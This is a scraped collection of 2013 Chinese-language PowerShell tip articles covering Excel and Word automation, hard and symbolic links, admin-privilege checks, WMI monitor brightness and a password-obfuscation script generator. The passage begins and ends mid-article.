$ws.columns.item(&quot;D:F&quot;).columnwidth=10.5 $ws.columns.item(&quot;B:B&quot;).EntireColumn.AutoFit() | out-null 顺便提一句，我将某些方法，比如 AutoFit() 输出到管道 Out-Null 来禁止不需要的输出。以下是很有意思的地方：我想如果能用上Excel的条件格式功能将会很酷。具体来说，我想用交通灯图标集来反映每个驱动器的使用量。如我之前所说，既然我们要创建一个Excel文件，那么尽量做到极致。我将为您演示这些代码，不用紧张:) $start=$ws.range(&quot;F4&quot;) #获取最后一个单元格 $Selection=$ws.Range($start,$start.End($xlDirection::xlDown)) #增加图标集 $Selection.FormatConditions.AddIconSetCondition() | Out-Null $Selection.FormatConditions.item($($Selection.FormatConditions.Count)).SetFirstPriority() $Selection.FormatConditions.item(1).ReverseOrder = $True $Selection.FormatConditions.item(1).ShowIconOnly = $False $Selection.FormatConditions.item(1).IconSet = xlIconSet::xl3TrafficLights1 $Selection.FormatConditions.item(1).IconCriteria.Item(2).Type = xlConditionValues::xlConditionValueNumber $Selection.FormatConditions.item(1).IconCriteria.Item(2).Value = 0.8 $Selection.FormatConditions.item(1).IconCriteria.Item(2).Operator = 7 $Selection.FormatConditions.item(1).IconCriteria.Item(3).Type = xlConditionValues::xlConditionValueNumber $Selection.FormatConditions.item(1).IconCriteria.Item(3).Value = 0.9 $Selection.FormatConditions.item(1).IconCriteria.Item(3).Operator = 7 我并不是一夜之间突然知道怎么用PowerShell来做这些事情。相反地，我创建了一个Excel宏，然后应用样式，然后将代码翻译成PowerShell脚本。我希望我可以为您提供一系列翻译的规则，但是碰到一系列障碍和错误。请注意常量的使用？（译者注：原文为I wish I could give you a set of translation rules, but it just takes trial and error and experience. Notice the use of the constant values?） 下一步，我将为插入一个柱形图到工作表： $chart=$ws.Shapes.AddChart().Chart $chart.chartType=$xlChart::xlBarClustered 我又一次采用了创建一个宏来观察其中的方法并修正其中的值的方法。接下来，我需要为图表选择数据源。 $start=$ws.range(&quot;A3&quot;) #获取最后一个单元格 $Y=$ws.Range($start,$start.End($xlDirection::xlDown)) $start=$ws.range(&quot;F3&quot;) #获取最后一个单元格 $X=$ws.Range($start,$start.End($xlDirection::xlDown)) 驱动器名称将作为Y轴，%Used将作为X轴。我将用这个区域的集合来定义图表的数据。 $chartdata=$ws.Range(&quot;A$($Y.item(1).Row):A$($Y.item($Y.count).Row),F$($X.item(1).Row):F$($X.item($X.count).Row)&quot;) $chart.SetSourceData($chartdata) 我希望对这个图表做的最后一件事是增加数据标题和图表标题。 $chart.seriesCollection(1).Select() | Out-Null $chart.SeriesCollection(1).ApplyDataLabels() | out-Null $chart.ChartTitle.Text = &quot;Utilization&quot; Excel很可能并不会按您所希望的位置摆放这个图表，所以您可以使用以下代码来定位它： $ws.shapes.item(&quot;Chart 1&quot;).top=40 $ws.shapes.item(&quot;Chart 1&quot;).left=400 Top 和 Left 是从Excel窗口开始计算的顶边距和左边距。可能会在获取右边距的时候遇到一些障碍和错误，但请注意在多台计算机上进行测试。最后一步是将工作表以计算机名来命名。 $xl.worksheets.Item(&quot;Sheet1&quot;).name=$name 当您明白所有这些Excel的魔法师如何工作的，那么要为您希望查看的每台计算机增加一个工作表也不是那么难了。以下截图显示最终的结果： 结论您可以下载我的演示脚本并且自己进行测试。如果您的确需要写数据到Excel，我建议您完整地操作一遍。也许需要掌握一些基础知识，但这方面的努力是值得的。下一步我们将演示如何从Excel文件中读取数据。 用PowerShell操作Office系列文章 在PowerShell中操作Word - 生成文档 在PowerShell中操作Word - 使用格式化样式 在PowerShell中操作Excel - 创建一个简单的报表 在PowerShell中操作Excel - 创建一个富Excel文档 在PowerShell中操作Excel - 读取数据","link":"/2013/09/19/integrating-microsoft-excel-with-powershell-create-a-rich-excel-doc/"},{"title":"PowerShell 技能连载 - PowerShell函数的详细输出","text":"若要为您的PowerShell函数增加指定的详细输出信息（verbose output），请增加 CmdletBinding 属性到您的函数，使它支持公共参数。（译者注：公共参数例如 -Verbose、-Debug 等） function test { [CmdletBinding()] param() } 下一步，添加 Write-Verbose 来输出文本信息。它们仅当用户指定了 -Verbose 参数时才有效： function test { [CmdletBinding()] param() Write-Verbose &quot;Starting&quot; &quot;Doing Something&quot; Write-Verbose &quot;Shutting Down&quot; } 所以当您按以下方式运行它时，您会见到正常的输出信息： PS &gt; test Doing Something 然而，如果您增加了 -Verbose 参数，您将会看到您输出的详细信息： PS &gt; test -Verbose Starting Doing Something Shutting Down","link":"/2013/09/19/verbose-output-for-powershell-functions/"},{"title":"PowerShell 技能连载 - 在文件管理器中显示隐藏文件","text":"PowerShell可以方便地读写注册表。注册表是Windows设置的中心仓库。 这是一个可以设置文件管理器显示/不显示隐藏文件的函数。它聪明的地方在于不需要向注册表写入新值。它相当于文件管理器窗口如何显示和改变它们的内容。 function Show-HiddenFile { param([Switch]$Off) $value = -not $Off.IsPresent Set-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced ` -Name Hidden -Value $value -type DWORD $shell = New-Object -ComObject Shell.Application $shell.Windows() | Where-Object { $_.document.url -eq $null } | ForEach-Object { $_.Refresh() } } Show-HiddenFile 使得隐藏文件变得可见而 Show-HiddenFile -Off 使得隐藏文件不可见。操作结果几乎在所有文件管理窗口中立即生效。如果您在没有打开文件管理窗口的情况下做出改变，则改变不会立即生效，因为没有可以调用 Refresh() 方法的窗口。","link":"/2013/09/20/showing-hidden-files-in-file-explorer/"},{"title":"在PowerShell中操作Excel - 读取数据","text":"欢迎回到“在PowerShell中操作Excel”三部曲系列文章。在这一系列的前两部分，我们学习了如何将数据写入Excel并且创建“富”报表，以及额外的格式化选项等Microsoft Excel高级用法。 对于IT专家来说，这个故事的另一半是如何从一个Excel文档中读取数据。它的挑战性在于您必须事先知道工作表的结构。我们可以搜索数据，但那是更复杂的情况。我假设您已有一个用过且了其解结构的Excel文档。这样，用PowerShell读取数据就不那么复杂。 读取数据像我们在本系列文章的前两部分那样，第一步是创建一个Excel应用程序对象。 $xl=New-Object -ComObject &quot;Excel.Application&quot; 我将在我的脚本中使用这个Excel文件。 用工作簿对象的 Open() 方法打开文件。 $wb=$xl.Workbooks.Open($file) $ws=$wb.ActiveSheet $ws对象是我们对数据最重要的的引用点。我需要用的数据从A2单元格开始。在我的测试环境中，我也许知道我需要处理多少行，但是既然我知道从哪儿开始，我可以用一个Do循环来读取每一行，获取数据，进行进一步操作。 $Row=2 do { $data=$ws.Range(&quot;A$Row&quot;).Text ... 通过使用Range属性，我可以获取A2单元格。Text属性是该单元格的值。我的示例脚本将要从第一列获取计算机名，获取一些WMI信息，然后向管道写入一个和电子表格的其它部分数据有关的自定义数据。 当您处理Excel数据的时候，我建议您进行一系列校验。假设单元格里有一个数据，我假设它是一个机器名，那么我会试着ping一下它。 if ($data) { Write-Verbose &quot;Querying $data&quot; $ping=Test-Connection -ComputerName $data -Quiet 如果ping通了，我将会使用WMI来获取操作系统名称，否则我会设置$OS变量为$Null。 if ($Ping) { $OS=(Get-WmiObject -Class Win32_OperatingSystem -Property Caption -computer $data).Caption } else { $OS=$Null 最后，对于每台计算机，我将用 New-Object cmdlet创建一个自定义对象。 New-Object -TypeName PSObject -Property @{ Computername=$Data.ToUpper() OS=$OS Ping=$Ping Location=$ws.Range(&quot;B$Row&quot;).Text AssetAge=((Get-Date)-($ws.Range(&quot;D$Row&quot;).Text -as [datetime])).TotalDays -as [int] } 请注意我设置的其它属性值，比如说Location，是位于B2单元格，至少对于这台计算机而言。请注意您从它的Text属性获取到的只是文本。但您还可以将它们转换为各种数据类型，就像我对AssetAge属性的处理那样。我从D2单元格读取文本，并把它转换为一个 DateTime 对象，于是我可以将它和当前时间做减法，得到一个 TimeSpan 对象。该对象有一个 TotalDays 属性。 loop循环的最后一步是使行计数器自增1。 $Row++ } While ($data) 下一次进入lopp循环的时候，脚本将会处理第3行的数据。直到PowerShell遇到一个空行。在最后，我将关闭文件并且退出。 $xl.displayAlerts=$False $wb.Close() $xl.Application.Quit() 我的脚本运行以后生成一下输出结果： PS C:\\scripts&gt; .\\Demo-ReadExcel.ps1 AssetAge : 687 Ping : True Computername : SERENITY Location : R1-1 OS : Microsoft Windows 7 Ultimate AssetAge : 293 Ping : True Computername : QUARK Location : R1-4 OS : Microsoft Windows 7 Professional AssetAge : 293 Ping : False Computername : SERVER01 Location : R3-2 OS : AssetAge : 2005 Ping : True Computername : JDHIT-DC01 Location : R2-1 OS : Microsoft(R) Windows(R) Server 2003, Enterprise Edition 我在PowerShell中用数的代码就可以实现从Excel电子表格中读取数据并且在我的程序中使用它。如果需要的话，我可以结合前面文章中的技术，在读取的同时更新电子表格的内容！ 结论您可以下载我的示例脚本并且自己做一下实验。记住，当使用PowerShell读取Excel文件的时候，您需要事先了解文档的结构，并且做好错误处理和数据有效性验证。我并不推荐初学者用PowerShell操作Excel，但具有一些经验并投入一些耐心以后，您可以得到很丰厚的回报。 用PowerShell操作Office系列文章 在PowerShell中操作Word - 生成文档 在PowerShell中操作Word - 使用格式化样式 在PowerShell中操作Excel - 创建一个简单的报表 在PowerShell中操作Excel - 创建一个富Excel文档 在PowerShell中操作Excel - 读取数据","link":"/2013/09/21/integrating-microsoft-excel-with-powershell-reading-data/"},{"title":"获取2013年剩余天数","text":"用PowerShell获取2013年剩余天数的两种写法。 ((Get-Date 2014-1-1) - (Get-Date)).Days 100 ([datetime]&quot;2014-1-1&quot; - [datetime]::now).Days 100 顺便励志一下，2013年只剩下100天了。Come on，小伙伴们！","link":"/2013/09/22/get-rest-days-of-2013/"},{"title":"PowerShell 技能连载 - 创建硬连接","text":"硬连接是NTFS文件系统中文件的“镜像”。它们使得一个文件能在多个文件系统位置（必须在一个卷中）中出现。 所以文件仅仅占用它的原始位置空间，但是在其它地方也可用。当您需要让大文件在多个地方可用的时候，这是一个十分有用的功能。 以下是 New-HardLink 函数的介绍。它演示了PowerShell如何调用底层的API函数： function New-HardLink { param ( [Parameter(Mandatory=$true)] $OriginalFilePath, [Parameter(Mandatory=$true)] $MirroredFilePath ) $signature = ' [DllImport(&quot;Kernel32.dll&quot;)] public static extern bool CreateHardLink(string lpFileName,string lpExistingFileName,IntPtr lpSecurityAttributes); ' Add-Type -MemberDefinition $signature -Name Creator -Namespace Link [Link.Creator]::CreateHardLink($MirroredFilePath,$OriginalFilePath,[IntPtr]::Zero) } 以下是它的使用方法： $Original = &quot;$env:temp\\testfile.txt&quot; $Copy1 = &quot;$env:userprofile\\Desktop\\mirrorfile1.txt&quot; $Copy2 = &quot;$env:userprofile\\Desktop\\mirrorfile2.txt&quot; # create original file: Set-Content -Path $Original -Value 'Hello' # create hard link #1: New-HardLink -OriginalFilePath $Original -MirroredFilePath $Copy1 # create hard link #2: New-HardLink -OriginalFilePath $Original -MirroredFilePath $Copy2 这段代码首先在临时文件夹中创建一个物理文件。然后在您的桌面上创建两个硬连接。它们看上去分别是mirrorfile1.txt和mirrorfile2.txt。虽然它们看上去像是独立的文件，而实际上他们都指向刚创建的临时文件。 您可以打开桌面上两个文件中的某一个，做一些修改，然后保存并关闭。当打开另一个文件时，您可以看到一模一样的修改后的内容。您还可以简单地删掉一个镜像文件来移除硬连接。","link":"/2013/09/23/creating-hard-links/"},{"title":"用 PowerShell 处理纯文本 - 1","text":"原始文本：”data1”:111,”data2”:22,”data3”:3,”data4”:4444444,”data5”:589要求：转换成对象 方法一，采用字符串运算及 ConvertFrom-StringData 命令： $rawTxt='&quot;data1&quot;:111,&quot;data2&quot;:22,&quot;data3&quot;:3,&quot;data4&quot;:4444444' $rawTxt -split ',' | ForEach-Object { $temp= $_ -split ':' &quot;{0}={1}&quot; -f $temp[0].Substring(1,$temp[0].Length-2),$temp[1] } | ConvertFrom-StringData 方法二，采用正则表达式，使用.NET的方法： $rawTxt = '&quot;data1&quot;:111,&quot;data2&quot;:22,&quot;data3&quot;:3,&quot;data4&quot;:4444444,&quot;data5&quot;:589' $regex = [regex] '&quot;(?&lt;name&gt;\\w*)&quot;:(?&lt;value&gt;\\d*),?' $match = $regex.Match($rawTxt) while ($match.Success) { [PSCustomObject]@{ Name = $match.Groups['name'].Value Value = $match.Groups['value'].Value } $match = $match.NextMatch() } 方法三，采用正则表达式，使用 Select-String Cmdlet： Select-String -InputObject $rawTxt -Pattern $regex -AllMatches | % { $_.Matches } | % { [PSCustomObject]@{ Name = $_.Groups['name'].Value Value = $_.Groups['value'].Value } } 三者的执行结果都是这样： Name Value ---- ----- data1 111 data2 22 data3 3 data4 4444444 data5 589 原命题参见：[PowerShell 文本处理实例(三)] 1","link":"/2013/09/23/processing-plain-text-with-powershell-1/"},{"title":"PowerShell 技能连载 - 检查管理员权限","text":"以下通过一个非常规的办法实现检查一段脚本是否以管理员权限运行（通过提升UAC），这体现了PowerShell强大的灵活性： function Test-Admin { [bool]((whoami /groups) -match &quot;S-1-16-12288&quot;) } 它的基本原理是检查当前用户是否是高完整性级别用户组的成员。该用户组是专门针对提升权限的管理员设置的。 如果您不想使用本地命令（whoami.exe）的话，还可以使用更贴近PowerShell（或.NET）的方法，如以下代码所示： function Test-Admin { $id = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent()) $id.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) }","link":"/2013/09/24/testing-administrator-privileges/"},{"title":"Clover 3 为您的 Windows Explorer 插上翅膀！","text":"Clover 3为您的Windows Explorer插上翅膀！Clover 是 Windows Explorer 资源管理器的一个扩展，为其增加类似谷歌 Chrome 浏览器的多标签页功能。 官方网站：易捷科技 Version:3.0.386 Requirements:Windows XP / Windows 7 / Windows 8 Language:English / 简体中文 / 繁體中文 / 日本語 / Français / Español / Deutsch / Nederlands / Português","link":"/2013/09/24/clover/"},{"title":"PowerShell 技能连载 - 创建符号链接","text":"符号链接使用起来很像“普通”的链接文件（*.lnk）：它们可以虚拟地指向任何文件或者文件夹，甚至UNC路径。和lnk文件不同的是，创建符号链接需要完整管理员权限，并且用户不可以存取符号链接属性。 以下是一个创建符号链接的函数： function New-SymbolicLink { param ( [Parameter(Mandatory=$true)] $OriginalPath, [Parameter(Mandatory=$true)] $MirroredPath, [ValidateSet('File', 'Directory')] $Type='File' ) if(!([bool]((whoami /groups) -match &quot;S-1-16-12288&quot;) )) { Write-Warning 'Must be an admin' break } $signature = ' [DllImport(&quot;kernel32.dll&quot;)] public static extern bool CreateSymbolicLink(string lpSymlinkFileName, string lpTargetFileName, int dwFlags); ' Add-Type -MemberDefinition $signature -Name Creator -Namespace SymbolicLink $Flags = [Int]($Type -eq 'Directory') [SymbolicLink.Creator]::CreateSymbolicLink($MirroredPath, $OriginalPath,$Flags) } $downloads = &quot;$env:userprofile\\Downloads&quot; $desktop = &quot;$env:userprofile\\Desktop\\MyDownloads&quot; New-SymbolicLink -OriginalPath $downloads -MirroredPath $desktop -Type Directory 当您（以管理员身份）运行这段代码时，它将使您能在桌面上访问下载文件夹。请右击符号链接并选择属性，并和“普通”的*.link文件做对比。","link":"/2013/09/25/creating-symbolic-links/"},{"title":"PowerShell 技能连载 - 检测显示器亮度","text":"如果您想检查您当前的显示器亮度（当然，尤其是针对笔记本电脑），以下是一个快捷的函数： function Get-MonitorBrightness { param($ComputerName, $Credential) Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness @PSBoundParameters | Select-Object -Property PSComputerName, CurrentBrightness, Levels } 它甚至支持 -ComputerName 和 -Credential，所以您也可以查询远程的主机。 如果您为 -ComputerName 参数传入一个用逗号分隔的主机名或IP地址列表，您将获得所有具有local Admin权限的主机的执行结果。","link":"/2013/09/26/check-monitor-brightness/"},{"title":"PowerShell 技能连载 - 设置显示器亮度","text":"如果您的显示驱动程序支持WMI，那么您可以用PowerShell改变显示器的亮度——甚至是远程的计算机！ 以下是实现改变显示器亮度的函数： function Set-MonitorBrightness { param ( [Parameter(Mandatory=$true)] [Int][ValidateRange(0,100)] $Value, $ComputerName, $Credential ) $null = $PSBoundParameters.Remove('Value') $helper = Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods @PSBoundParameters $helper.WmiSetBrightness(1, $Value) } 只需要指定一个0-100之间的值，您就可以看到显示器亮度发生改变。为 -ComputerName 参数指定远程计算机名或IP地址（均支持多个），然后您远程的同事们会惊讶地发现去吃午餐的时候显示器都变暗了！当然，远程操作WMI需要本地管理员权限，并且为防火墙设置了允许远程管理的规则。 如果提示“不支持”的错误提示信息，那么说明您的显示驱动程序不支持WMI。 这是“有趣”的部分：模拟一个古怪的显示效果： for($x=0; $x -lt 20; $x++) { Set-MonitorBrightness -Value (Get-Random -Minimum 20 -Maximum 101) Start-Sleep -Seconds 1 }","link":"/2013/09/27/setting-monitor-brightness/"},{"title":"Visual Studio的PowerShell扩展工具","text":"Visual Studio的PowerShell扩展工具为Visual Studio 2012和2013 RC增加了PowerShell语言支持。 本工具目前为BETA版。 下载地址：Visual Studio工具库开源项目：GitHub 必须条件： Visual Studio 2012或2013 RC PowerShell 3.0 Windows 8和Server 2012已自带 Windows 8或Server 2012以下的系统需要Windows Management Framework 3.0 编辑器扩展语法高亮、智能感知和代码折叠 方法导航 调试器扩展脚本输出 断点支持 本地变量支持 调用堆栈支持 工程系统支持","link":"/2013/09/28/powershell-tools-for-visual-studio/"},{"title":"在PowerShell中操作Word - 生成文档","text":"我假设许多读者用PowerShell生成服务器、事件以及Windows网络上各种数据的报表。您也许创建过纯文本文件，甚至漂亮的HTML报表。但是您也可以用上Microsoft Word，当然，前提是您已经安装了Word。在这个系列的第二部分，我将会向您演示如何用PowerShell为Word文档套用样式。 创建Word应用程序对象PowerShell可以通过COM接口控制Word应用程序。有趣的地方是，虽然您可以交互式地做所有的操作，但我希望您最终能够用脚本操作一切。我们从创建一个Word程序对象开始。 PS C:\\&gt; $word=new-object -ComObject &quot;Word.Application&quot; 如果您好奇的话，可以将这个对象输出到 Get-Member 命令。我们将创建一系列对象，您可以将每一个对象通过管道输出到 Get-Member 来探索它们。 下一步，我们创建一个文档对象。 PS C:\\&gt; $doc=$word.documents.Add() 现在，Word程序已经启动，并且创建了一个新文档，但是您在屏幕上看不到任何东西。通常这是正常的，因为我们需要它在后台运行。但是如果您想查看所创建的文档，您需要将应用程序的 Visible 属性设置为 True。 PS C:\\&gt; $word.Visible=$True 在我们插入文本之前，我们需要获取焦点。创建一个 Selection 对象可以帮我们做一些诸如设置字体大小和颜色等操作，我们将在第二部分介绍这些操作。 PS C:\\&gt; $selection=$word.Selection 用PowerShell在文档中插入文本现在光标在文档的顶部，现在可以开始插入文本了。我们将用 Selection 对象的 TypeText() 方法插入当前的日期和时间。 PS C:\\&gt; $selection.TypeText((Get-Date)) 如果我们继续插入文本，那么文本将会紧挨在日期的后面。现在我们用 TypeParagraph() 方法插入一个回车符。 PS C:\\&gt; $selection.TypeParagraph() 让我们继续插入一些文本。我将用WMI获取本地计算机的操作系统信息。 PS C:\\&gt; $os=Get-WmiObject -class win32_OperatingSystem PS C:\\&gt; $selection.TypeText(&quot;Operating System Information for $($os.CSName)&quot;) 由于我希望写入所有的非系统属性，所以我将快速递创建一个数组用来保存所有的属性名。 PS C:\\&gt; $os.properties | select Name | foreach -begin {$props=@()} -proc {$props+=&quot;$($_.name)&quot;} 现在我可以从 $os 获取所有的属性并插入Word文档。很重要的一点是 TypeText() 的值是字符串型的，所以我需要将内联的PowerShell表达式通过管道输出到 Out-String。 PS C:\\&gt; $selection.TypeText(($os | Select -Property $props | Out-String)) 如果需要的话，还可以继续插入文字和图片。当完成操作以后，我将保存并关闭文档。 PS C:\\&gt; $doc.SaveAs([ref]&quot;c:\\work\\osreport.docx&quot;) PS C:\\&gt; $doc.Close() 请确认使用 [ref] 为文件路径转换数据类型。假设我不再创建新的文档，那么剩下的就是关闭Word应用程序。 PS C:\\&gt; $word.quit() 这些就是要做的所有事情。最终生成的Word文档是可用的，虽然可能不太漂亮。在我的例子中发现一个问题：Word用的事非等宽字体，而PowerShell的输出格式假设用的是等宽字体。（译者注：可能会造成输出的结果对不整齐）。在第二部分，我将向您演示如何解决这些问题。同时，欢迎下载示例脚本 New-WordDoc.ps1。 用PowerShell操作Office系列文章 在PowerShell中操作Word - 生成文档 在PowerShell中操作Word - 使用格式化样式 在PowerShell中操作Excel - 创建一个简单的报表 在PowerShell中操作Excel - 创建一个富Excel文档 在PowerShell中操作Excel - 读取数据","link":"/2013/09/28/integrating-microsoft-word-with-powershell-generate-a-document/"},{"title":"在PowerShell中操作Word - 使用格式化样式","text":"在这个系列的上一步中，我们演示了用Windows PowerShell创建Microsoft Word文档的基本步骤。如果您试用了我的示例脚本，您会注意到文档格式化方面略有不足。幸运的是，我们有一些简洁的办法来改进您文档的质量，我将会在这篇文章中向您演示这个过程。我们将用第一部分的脚本作为起点。 关键之处在于 Selection 对象。 PS C:\\&gt;$word=new-object -ComObject &quot;Word.Application&quot; PS C:\\&gt;$doc=$word.documents.Add() PS C:\\&gt; $selection=$word.Selection 您可以更改 Selection 对象的一个重要元素是 Font。您可以轻松地修改字体大小和颜色，以及使用哪种字体。我将把日期和时间的字体改为绿色。 PS C:\\&gt; $selection.Font.Color=&quot;wdColorGreen&quot; PS C:\\&gt; $selection.TypeText((Get-Date)) 在VBScript的年代中，我们需要定义 wdColorGreen 的值并将它赋给一个常量。但是在PowerShell中我们可以轻松地以字符串的形式插入这个常量。您一定很好奇有哪些颜色可以使用？问问PowerShell吧： PS C:\\&gt; [enum]::GetNames([microsoft.office.interop.word.wdcolor]) 您需要把字体颜色改回来，除非您需要把整个文档设为这个颜色。 PS C:\\ &gt;$selection.font.Color=&quot;wdColorAutomatic&quot; PS C:\\&gt; $selection.TypeParagraph() 在我原先的脚本中我插入了一个标题。现在我们把它变成大一点的字体。我将用我上次使用的WMI代码。 $selection.Font.Size=12 $selection.TypeText(&quot;Operating System Information for $($os.CSName)&quot;) 回顾一下前面一篇文章，有一个问题是PowerShell输出到Word早期是用等宽字体而后来用的是非等宽字体。解决方法是从PowerShell中插入结果之前指定一个合适的字体。 PS C:\\&gt; $selection.Font.Size=10 PS C:\\&gt; $selection.Font.Name=&quot;Consolas&quot; PS C:\\&gt; $selection.TypeText(($os | Select -Property $props | Out-String)) 还要做的最后一件事是添加一段格式化的文本，说明报告的创建者。我希望采用Word的斜体格式来呈现。 PS C:\\&gt; $selection.Font.size=8 PS C:\\&gt; $selection.Font.Name=&quot;Calibri&quot; PS C:\\&gt; $selection.Font.Italic=$True PS C:\\&gt; $by=&quot;Report created by $env:userdomain\\$env:username&quot; PS C:\\&gt; $selection.TypeText($by) 我相信您一定也掌握了如何使文本变成粗体。 除了指定字体之外，您还可以采用Word内置的样式。 $selection.Style=&quot;Title&quot; $selection.TypeText(&quot;Operating System Report&quot;) $selection.TypeParagraph() 您可以用PowerShell查询 Document 对象，看看有哪些样式可以用。 $doc.Styles | select NameLocal 大多数这些样式只能应用在文本的第一行，不过您也可以自己做实验调整一下。 通过这些步骤您可以简洁地通过您的PowerShell脚本创建一个漂亮的Word文档。请下载版本修订过的脚本，New-WordDoc2，并且自己做一下实验。 用PowerShell操作Office系列文章 在PowerShell中操作Word - 生成文档 在PowerShell中操作Word - 使用格式化样式 在PowerShell中操作Excel - 创建一个简单的报表 在PowerShell中操作Excel - 创建一个富Excel文档 在PowerShell中操作Excel - 读取数据","link":"/2013/09/29/integrating-microsoft-word-with-powershell-format-style-documents/"},{"title":"PowerShell 技能连载 - 通过关键词查找脚本","text":"随着您硬盘上的 PowerShell 脚本数量的增多，要想找到您想要的脚本会变得越来越困难。以下是一个叫做 Find-Script 的工具函数。只要传入一个关键词，PowerShell 将会在您的个人文件夹下找出所有包含该关键词的脚本。 查找的结果将在一个 GridView 窗口中显示，您可以选中其中的文件，按下确认按钮以后将用 ISE 编辑器打开这些文件。 function Find-Script { param ( [Parameter(Mandatory=$true)] $Keyword, $Maximum = 20, $StartPath = $env:USERPROFILE ) Get-ChildItem -Path $StartPath -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue | Select-String -SimpleMatch -Pattern $Keyword -List | Select-Object -Property FileName, Path, Line -First $Maximum | Out-GridView -Title 'Select Script File' -PassThru | ForEach-Object { ise $_.Path } } 默认情况下，Find-Script 只返回满足搜索条件的前 20 个脚本。您可以通过 -Maximum 和 -StartPath 参数来改变最大搜索条数和搜索位置。","link":"/2013/09/30/finding-scripts-by-keyword/"},{"title":"PowerShell 技能连载 - 通过CSV创建对象","text":"有多种方法可以创建自定义对象。以下是一种创新的办法，在很多种场景中都很有效：创建一个逗号分隔，每行表示一个值的列表文本，然后用 ConvertFrom-Csv 来创建对象： for($x=0; $x -lt 20; $x++) { ($x,(Get-Random),(Get-Date) -join ',') | ConvertFrom-Csv -Header ID, RandomNumber, Date } 不过，这种做法效率并不是很高。还有三种其它方法可以用来创建对象。分别用 Measure-Command 测量创建 2000 个对象所消耗的时间： Measure-Command { for($x=0; $x -lt 2000; $x++) { ($x,(Get-Random),(Get-Date) -join ',') | ConvertFrom-Csv -Header ID, RandomNumber, Date } } Measure-Command { for($x=0; $x -lt 2000; $x++) { $obj = 1 | Select-Object -Property ID, RandomNumber, Date $obj.ID = $x $obj.RandomNumber = Get-Random $obj.Date = Get-Date $obj } } Measure-Command { for($x=0; $x -lt 2000; $x++) { [PSObject]@{ ID = $x RandomNumber = Get-Random Date = Get-Date } } } Measure-Command { for($x=0; $x -lt 2000; $x++) { [Ordered]@{ ID = $x RandomNumber = Get-Random Date = Get-Date } } } 如结果所示，最后两种方法的效率是 CSV 方法的大约三倍。在我们的测试系统上，所有的测试都在一秒之内完成，所以现实环境中影响并不大。 请挑选一个您自己最喜欢的方式——不过请注意最后一个例子需要 PowerShell 3.0 或更高的版本。","link":"/2013/10/01/creating-objects-with-csv/"},{"title":"PowerShell 技能连载 - 查找所有用户脚本","text":"有些时候我们会疑惑当 PowerShell 启动的时候，将执行哪些启动脚本。它们数量很多，而且各不相同，要看您运行的是 PowerShell 控制台，ISE，还是其他宿主。 然而，了解您的用户脚本是十分重要的。它们决定了应用到 PowerShell 环境的配置。 这个 Get-PSProfileStatus 函数列出了所有宿主（PowerShell 环境）可能用到的的启动脚本。它也显示了哪些脚本是物理存在的。 function Get-PSProfileStatus { $profile | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name | ForEach-Object { $_, (Split-Path $profile.$_ -Leaf), (Split-Path $profile.$_), (Test-Path -Path $profile.$_) -join ',' | ConvertFrom-Csv -Header Profile, FileName, FolderName, Present } } Get-PSProfileStatus 结果看起来类似这样： 将结果用管道输出到 Out-GridView 来查看，避免截断字符被截断： Get-PSProfileStatus | Out-GridView","link":"/2013/10/02/finding-all-powershell-profile-scripts/"},{"title":"PowerShell 技能连载 - 将Excel导出的CSV转换为UTF-8编码","text":"当您导出 Microsoft Excel 数据表到 CSV 文件时，Excel缺省将保存为 ANSI 编码的 CSV 文件。这是很糟糕的，因为当您用 Import-Csv 导入数据到 PowerShell 中时，特殊字符将会截断（译者注：例如中文出现乱码）。 要确保特殊字符不会丢失，您必须确保导入数据之前 CSV 文件采用的是 UTF-8 编码： $Path = 'c:\\temp\\somedata.csv' (Get-Content -Path $Path) | Set-Content -Path $Path -Encoding UTF8","link":"/2013/10/03/converting-excel-csv-to-utf8/"},{"title":"在PowerShell中以管理员身份运行程序","text":"对于已知的需要以管理员身份运行的命令，我们可以通过这个 Invoke-Admin 函数运行。这个函数确保以管理员身份运行一个程序。如果不是以管理员身份运行，则将弹出 UAC 对话框。 function Invoke-Admin() { param ( [string]$program = $(throw &quot;Please specify a program&quot; ), [string]$argumentString = &quot;&quot;, [switch]$waitForExit ) $psi = new-object &quot;Diagnostics.ProcessStartInfo&quot; $psi.FileName = $program $psi.Arguments = $argumentString $psi.Verb = &quot;runas&quot; $proc = [Diagnostics.Process]::Start($psi) if ( $waitForExit ) { $proc.WaitForExit(); } } 来源：Showing the UAC prompt in PowerShell if the action requires elevation","link":"/2013/10/05/invoke-admin-in-powershell/"},{"title":"PowerShell 技能连载 - 检查磁盘分区和数据块大小","text":"WMI 是一个装满信息的宝库。以下这行代码将读取本地分区以及它们的数据块大小信息： Get-WmiObject -Class Win32_Diskpartition | Select-Object -Property __Server, Caption, BlockSize 使用 Get-WmiObject 的 -ComputerName 参数可以对一台或多台机器远程执行同样的操作。 要查看其它所有的 WMI 类，您可以替换掉 Win32_DiskPartition，试试以下的代码： Get-WmiObject -Class Win32_* -List | Where-Object { ($_.Qualifiers | Select-Object -ExpandProperty Name) -notcontains 'Association' } | Where-Object { $_.Name -notlike '*_Perf*' }","link":"/2013/10/04/checking-disk-partitions-and-block-size/"},{"title":"PowerShell 技能连载 - 密码混淆器脚本","text":"曾经需要将密码保存在脚本中？曾经需要自动弹出一个身份验证对话框？对于前者，将密码和其它身份信息存储在脚本中是很糟糕的对于后者，如果您这么做了的话，至少能使黑客更难于窃取信息。 以下是一个脚本生成器。运行它，并且输入一个域/用户名和密码，脚本生成器会为您生成一段新脚本。 $pwd = Read-Host 'Enter Password' $user = Read-Host 'Enter Username' $key = 1..32 | ForEach-Object { Get-Random -Maximum 256 } $pwdencrypted = $pwd | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -Key $key $text = @() $text += '$password = &quot;{0}&quot;' -f ($pwdencrypted -join ' ') $text += '$key = &quot;{0}&quot;' -f ($key -join ' ') $text += '$passwordSecure = ConvertTo-SecureString -String $password -Key ([Byte[]]$key.Split(&quot; &quot;))' $text += '$cred = New-Object system.Management.Automation.PSCredential(&quot;{0}&quot;, $passwordSecure)' -f $user $text += '$cred' $newFile = $psise.CurrentPowerShellTab.Files.Add() $newFile.Editor.Text = $text | Out-String 这段脚本包含混淆过的密码脚本，看起来大概类似这样： $password = 